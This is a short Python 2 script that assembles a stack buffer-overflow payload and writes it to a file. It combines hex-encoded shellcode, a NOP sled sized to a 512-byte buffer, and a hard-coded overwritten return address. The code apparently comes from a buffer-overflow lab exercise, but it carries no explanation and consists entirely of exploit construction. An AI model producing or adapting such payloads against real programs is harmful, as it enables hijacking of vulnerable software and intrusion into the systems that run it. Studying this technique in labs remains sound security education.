shell_code = """
8d 44 24 28 89 c5 83 ec 04 c7 04 24 93 8c 04 08 b8 d1 92 ee 7c c3
"""
buff_len = 512
nop_len = 490
t_len = buff_len + 8
exploit_code = ["90" for i in range(t_len)]
idx = int("0x16",16)
exploit_code[nop_len:nop_len + idx] = shell_code.split()
exploit_code[t_len-4:] = ["CA", "33", "68", "55"]
print exploit_code
with open("shellcode.txt", "w") as f:
    f.write(" ".join(exploit_code))